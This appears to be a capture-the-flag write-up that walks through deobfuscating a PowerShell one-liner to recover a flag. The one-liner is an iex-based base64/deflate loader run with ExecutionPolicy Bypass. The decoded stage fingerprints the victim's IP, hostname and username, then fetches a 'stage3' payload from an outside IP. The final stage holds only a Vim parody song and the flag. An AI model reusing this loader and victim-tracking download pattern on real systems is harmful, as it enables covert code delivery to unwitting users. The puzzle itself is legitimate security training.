
Deobfuscate the script to find the flag.
If you find an IP that you can't connect to, replace it with `https://problems.metactf.com/`.

```powershell
powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('hVRdb9owFH1H4j9YFAmiNab0Y6tou6mFrUXaOjTo+lBNrZtciLdge/ZNaNT1v+/GBAbbw4IEuZ/nnuNrTnfYWM+BGb0A6xJIUxbpGNjO23ptmqkIpVbsEhRYgRB+leSYDwfsuV5j9DQzB1YJqj9jTVB574bsa7JPqnhkss1wX89Nhtsp0lC0zR6WZvlcAobXgMNRX6upnGUEXU7xazPnNgEL4efH7xAhe2Z/Ar7nPR+O8sMBTEWW4iVNvhAFCxWwpsqI4cN2eihU/LePWtAI57EwNC4fo8DM+Q6NgXSRVopwIW5slr2sjMCjn8exBefovXqr1yrGCE9YKkLMX7FGs0Hfa6HWjpWyVc1FgeCo6G5cOIQ5n1AP/l7RWUk1+9br3ShZnhsn7Xxq26MEVbVPhHjige9I1hwsUtVEXwgHrw/HaKlNe4kSrAedx0cEqWAR6qXQ4aQwUB4eq8YYQ5RZiQXv28KgnllhkoJ/Ghwt7THYXEYwsjqXMdjV0uD0+D99Pb2byYfjFcWqNBEu2VDhQmJFBqynsyJCk/Nq2a6opO0xN8TZECQIgu3m/pdP9MfySrQDFlowqYiAtcLWLmu1Tlb6WMDMqmU+OV9K/y2pAeGVdkibohcq1aIcnxlRpELHjXqtmftLdC9jwvrnZlGfocr1Dwhv4fEL/MzAYbuVIJpep9PdO+T7B2/4Ae929ztZLvb3uscdh2IGB9y47rtlaxmftcoVWgMRwdMdNtNsqi0muwyexFzSLmMCTDzqHJiLrDRYxr1zmoqZ/wsoP78B'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
```

```powershell
powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C "
```

```powershell
Set-ALIAS a New-Object;
iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('
```

```
hVRdb9owFH1H4j9YFAmiNab0Y6tou6mFrUXaOjTo+lBNrZtciLdge/ZNaNT1v+/GBAbbw4IEuZ/nnuNrTnfYWM+BGb0A6xJIUxbpGNjO23ptmqkIpVbsEhRYgRB+leSYDwfsuV5j9DQzB1YJqj9jTVB574bsa7JPqnhkss1wX89Nhtsp0lC0zR6WZvlcAobXgMNRX6upnGUEXU7xazPnNgEL4efH7xAhe2Z/Ar7nPR+O8sMBTEWW4iVNvhAFCxWwpsqI4cN2eihU/LePWtAI57EwNC4fo8DM+Q6NgXSRVopwIW5slr2sjMCjn8exBefovXqr1yrGCE9YKkLMX7FGs0Hfa6HWjpWyVc1FgeCo6G5cOIQ5n1AP/l7RWUk1+9br3ShZnhsn7Xxq26MEVbVPhHjige9I1hwsUtVEXwgHrw/HaKlNe4kSrAedx0cEqWAR6qXQ4aQwUB4eq8YYQ5RZiQXv28KgnllhkoJ/Ghwt7THYXEYwsjqXMdjV0uD0+D99Pb2byYfjFcWqNBEu2VDhQmJFBqynsyJCk/Nq2a6opO0xN8TZECQIgu3m/pdP9MfySrQDFlowqYiAtcLWLmu1Tlb6WMDMqmU+OV9K/y2pAeGVdkibohcq1aIcnxlRpELHjXqtmftLdC9jwvrnZlGfocr1Dwhv4fEL/MzAYbuVIJpep9PdO+T7B2/4Ae929ztZLvb3uscdh2IGB9y47rtlaxmftcoVWgMRwdMdNtNsqi0muwyexFzSLmMCTDzqHJiLrDRYxr1zmoqZ/wsoP78B
```

```
'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
```

```powershell
"
```

---

code extracted with python file ps.py
```powershell

<# Some powershell code #>       
function Generate-VictimID {     
    $username = $env:UserName;   
    $cpuname = $env:ComputerName;
    $ip = ( `
        Get-NetIPConfiguration | `
        Where-Object {
            $_.IPv4DefaultGateway -ne $null `
            -and `
            $_.NetAdapter.Status -ne "Disconnected" `
        } `
    ).IPv4Address.IPAddress

    $text = $ip + "$" + $cpuname + "$" + $username
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
    $EncodedText =[Convert]::ToBase64String($Bytes)

    $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $utf8 = new-object -TypeName System.Text.UTF8Encoding
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($EncodedText)))
    $hash = $hash.ToLower() -replace '-', '';

    return $hash;
}

Write-Host "Downloading paylaod"
$victim_id = Generate-VictimID;
Invoke-WebRequest('http://104.237.3.112/uva2018/stage3.ps1?victimid=' + $victim_id)
<# go forth, examine the above script for the flag #>

```

Let's build the url
https://problems.metactf.com/uva2018/stage3.ps1?victimid=

```
<# Hotel Encryption #>
<# On a dark Linux Bash prompt, new boss in my hair
Hot coffee and hardware, stale conditioned air
ls listing the files, I cat configs that ain't right
My head so heavy and my sight so dim
I'd have to work through the night

There she sat in the bin dir, I heard the terminal bell
And I was thinking to myself
"Just a quick tweak and all will be well"
Then she lit up the keyboard, and she showed me the way
Three letters in the dark of night
I thought I heard Vim say

Welcome to the Hotel :q!
What a focused place (such a spacious place)
What a maker's space.
Buffers abound at the Hotel :q!
Any kind of gear (any kind of gear)
You can find Vim here

Her modes are insert and normal, she got a visual trend
She got a lot of frantic, fledgling fans, that she calls friends
How they mash in frustration, sweet intern sweat
Some mash the Escape key, some mash CTRL-C

So I call up Stack O'flow, "How do I exit Vim?"
It said, "We get that question here since, 1991"
And still new coders are howling from far away,
Hit you up in the middle of a break
Just to hear Vim say

Welcome to the Hotel :q!
What a focused place (such a spacious place)
What a maker's space.
They rub 'ESC' blank at the Hotel :q!
What a /wonderland/ (what an &),
Bring your Ex commands

Fingers on the home row, not a mouse in sight
And she said, "We are all Vim's prisoners here, of our own device"
And from the master branches, they `i` changes to the hash
They Zed-Zed with their cherry reds, and the buffer fades to bash

Last thing I remember, I was yearning to grok more
I had to get the sourcecode back, to the place I was before
"Relax" said the Vim tuts, "Vim is programmed to receive.
#>
Write-Host "you_can_obfuscate_anything_you_like_but_you_can_never_leave"

<# credit: https://www.reddit.com/r/ProgrammerHumor/comments/6v16br/hotel_vim/ #>
```

you_can_obfuscate_anything_you_like_but_you_can_never_leave